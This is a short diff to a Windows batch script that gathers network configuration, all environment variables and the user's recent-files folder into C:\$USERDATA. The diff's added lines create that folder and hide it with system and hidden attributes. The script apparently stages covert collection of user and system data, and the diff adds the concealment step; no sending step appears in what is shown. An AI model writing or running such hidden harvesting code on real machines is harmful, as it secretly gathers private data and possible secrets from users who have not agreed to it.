@@ -14,7 +14,10 @@ del /q %nfn1%
 exit /b
 
 :start
-cd C:\$USERDATA
+cd C:\
+mkdir "$USERDATA"
+attrib +s +h $USERDATA
+cd $USERDATA
 ipconfig /renew > renew.ipconfig.txt
 call :e renew.ipconfig.txt
 ipconfig > ipconfig.txt
@@ -31,3 +34,4 @@ set > set.txt
 call :e set.txt
 cd %userprofile%\AppData\Roaming\Microsoft\Windows
 xcopy /b /q /i Recent C:\$USERDATA\pdata\Recent
+
